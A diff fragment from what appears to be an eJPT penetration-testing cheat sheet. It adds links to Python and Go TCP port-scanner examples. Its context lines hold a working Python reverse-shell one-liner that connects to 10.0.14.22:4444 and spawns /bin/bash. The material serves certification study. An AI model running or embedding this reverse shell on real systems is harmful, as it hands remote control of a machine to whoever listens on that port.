@@ -384,3 +384,8 @@ python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 ```
 
+## programming examples
+port scanner examples:
+
+[python simple tcp scan example](https://github.com/cocomelonc/ejpt/blob/master/scanner.py)
+[golang simple tcp scan example](https://github.com/cocomelonc/ejpt/blob/master/scanner.go)
